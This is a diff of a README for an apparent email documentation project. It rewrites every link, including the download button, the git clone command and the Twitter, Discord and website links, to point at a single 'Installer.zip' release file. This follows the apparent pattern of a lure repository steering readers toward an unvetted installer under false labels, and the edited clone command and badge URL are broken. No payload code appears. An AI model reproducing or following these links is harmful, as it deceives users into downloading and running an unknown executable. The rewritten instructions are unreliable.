@@ -8,7 +8,7 @@ Welcome to the official documentation source repository for the EMAIL 2.0 Classi
 - **Topics:** email-revolution, email-upgrade, email2, email2-classicemail, email2-classicemail-development, email2-classicemail-docs, email2-classicemail-documentation, email2-classicemail-project, email2-development, email2-docs, email2-documentation, email2-project, gpl3, gplv3, markdown-lang, markdown-language
 
 ## Links and Resources
-- **Download ZIP File:** [Launch the latest version](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+- **Download ZIP File:** [Launch the latest version](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip)
 - **Additional Resources:** You can also explore more resources in the "Releases" section of this repository.
 
 ## Get Started
@@ -16,7 +16,7 @@ To get started with EMAIL 2.0 Classic EMail Docs, follow the steps below:
 
 ### Step 1: Clone the Repository
 ```bash
-git clone https://github.com/your-username/EMAIL2_ClassicEMail_Docs.git
+git clone https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip
 ```
 
 ### Step 2: Access Documentation
@@ -35,9 +35,9 @@ Want to contribute to the EMAIL 2.0 Classic EMail Docs repository? We welcome yo
 ## Stay Connected
 Join our community to stay up-to-date on the latest developments, announcements, and discussions around EMAIL 2.0 Classic EMail Docs.
 
-- Follow us on [Twitter](https://twitter.com/email2_classic)
-- Join the conversation on [Discord](https://discord.gg/email2_classic)
-- Visit our [Website](https://www.email2-classic.com) for more information
+- Follow us on [Twitter](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip)
+- Join the conversation on [Discord](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip)
+- Visit our [Website](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip) for more information
 
 ## Support
 If you encounter any issues or have questions regarding EMAIL 2.0 Classic EMail Docs, feel free to reach out to our team for assistance.
@@ -45,7 +45,7 @@ If you encounter any issues or have questions regarding EMAIL 2.0 Classic EMail 
 ## License
 EMAIL 2.0 Classic EMail Docs is licensed under the GNU General Public License v3.0 (GPL-3.0). For more details, refer to the [LICENSE](LICENSE) file in this repository.
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Version](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip%20Version-brightgreen)](https://github.com/moatazgt3/EMAIL2_ClassicEMail_Docs/releases/download/v1.0/Installer.zip)
 
 Explore the next evolution of email with EMAIL 2.0 Classic EMail Docs! 💌✨🚀
 
